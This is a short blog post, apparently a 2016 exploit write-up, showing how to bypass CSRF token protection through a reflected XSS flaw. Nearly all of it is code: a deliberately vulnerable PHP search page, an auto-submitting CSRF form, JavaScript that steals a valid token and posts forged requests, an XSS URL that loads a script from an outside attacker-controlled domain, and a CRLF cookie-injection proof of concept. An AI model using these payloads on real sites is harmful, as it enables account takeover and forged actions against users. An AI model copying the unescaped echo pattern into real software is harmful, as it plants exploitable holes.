---
title: Bypass CSRF Protection via XSS
date: 2016-05-26 23:34:37
tags: CSRF
---

> login.php

```
<?php
session_start();

if (!isset($_POST['name'])) {
    $token = md5(uniqid(rand(), TRUE));
    $_SESSION['token'] = $token;
    file_put_contents($debugFile, "\nissuing token: " . $token, FILE_APPEND | LOCK_EX);
    echo '
        <html>
            <body>

                <form  id="form" action="" method="post">
                    <input type="hidden" name="token" value="' . $token . '" />
                    Name: <input type="text" name="name"><br>
                    <input type="submit">
                </form>

            </body>
        </html>';
} else {
    if ($_POST['token'] == $_SESSION['token']) {
        echo "\ntoken ok: " . $_POST['name'];
    } else {
        echo "\nwrong token given: " . $_POST['token'] . " expected: " . $_SESSION['token'];
    }
}
```
<!--more-->
### CSRF POC

```
<html>
  <body>
    <form action="http://192.168.0.10/csrf.php" method="POST">
      <input type="hidden" name="token" value="d39489b21bc8a5e29670ab13ec959510" />
      <input type="hidden" name="name" value="admin" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

> search.php has XSS vulnerability

```
<html>
    <body>
        <?php echo $_GET['s']; ?>
    </body>
</html>
```
### token in body
> script.js

```
<script>
var csrfProtectedPage = 'http://192.168.0.10/csrf.php';
var csrfProtectedForm = 'form';

// get valid token for current request
var html = get(csrfProtectedPage);
document.body.innerHTML = html;
var form = document.getElementById(csrfProtectedForm);
var token = form.token.value;

// build form with valid token and evil credentials
document.body.innerHTML
        += '<form action="' + csrfProtectedPage + '" method="POST">'
        + '<input type="hidden" name="token" value="' + token + '">'
        + '<input id="username" name="name" value="xl7dev">'
        + '</form>';

// submit form
document.forms[0].submit();

function get(url) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
</script>
```
### token in header
```
<script>
function readBody(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else {
        data = xhr.response;
    }
    var parser = new DOMParser();
    var resp = parser.parseFromString(data, "text/html");
    token = resp.getElementsByName('Token')[0].value;
    csrf(token);
    return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
        response = readBody(xhr);
  }
}
xhr.open('GET', 'http://192.168.0.10/csrf.php', true);
xhr.send(null);
function csrf(token) {
    //var sendWidgetModel = {
    //    "toEmail": 'john.doe@example.com',
    //    "widgetMessage": "Goodbye, John. We are not friends.",
    //};
    var x1 = new XMLHttpRequest();
    x1.open("POST", "http://192.168.0.10/csrf.php");
    x1.setRequestHeader("Content-Type", "application/json; charset=utf-8");
    x1.setRequestHeader('_token', token);
    //x1.send(JSON.stringify(sendWidgetModel));
    x1.send("toEmail=john.doe@example.com&widgetMessage=Goodbye, John. We are not friends.");
}
</script>
```
### Bypass CSRF
```
http://192.168.0.10/search.php?s=<script src="http://www.youdomain.com/script.js"></script>
```

### CRLF POC
```
<form id="csrf" action="https://192.168.0.10/post.php" method="POST"> 
<input type="hidden" name="lang" value="en" /> 
<input type="hidden" name="content" value="CSRF_Test" /> 
<input type="hidden" name="csrf_token" value="xxxxxxxxxxxxxxx" /> 
<input type="submit" value="Submit request" /> 
</form> 
<img src="http://192.168.0.10/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxx;" onerror="csrf.submit()">
```